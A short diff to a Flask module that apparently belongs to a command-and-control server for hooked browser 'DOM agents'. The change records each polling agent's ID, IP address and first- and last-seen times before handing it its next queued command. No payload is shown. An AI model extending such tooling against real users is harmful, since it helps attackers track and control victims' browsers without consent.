@@ -2,7 +2,7 @@ import time
 import json
 import re
 from datetime import datetime
-from app import db, ConnectedAgents, extraModules, AutomaticModuleExecution
+from app import db, ConnectedAgents, ConnectedDomAgents, extraModules, AutomaticModuleExecution
 from flask import jsonify, request, Blueprint, Response, render_template
 from database.models import Url, Registration, Agent, Module, DomCommand
 from config import Config
@@ -93,6 +93,11 @@ def domGetCommand():
     agentID = str(request.args.get('agentID'))
     if agentID is None or agentID == '':
         return Response("", 404)
+    if agentID not in ConnectedDomAgents:
+        ConnectedDomAgents[agentID] = {'first_seen': time.time()}
+    ConnectedDomAgents[agentID]['id'] = agentID
+    ConnectedDomAgents[agentID]['ip'] = safeParam(request.remote_addr)
+    ConnectedDomAgents[agentID]['last_seen'] = time.time()
     dom_command = db.session.query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 0).first()
     res = {}
     if dom_command is not None:
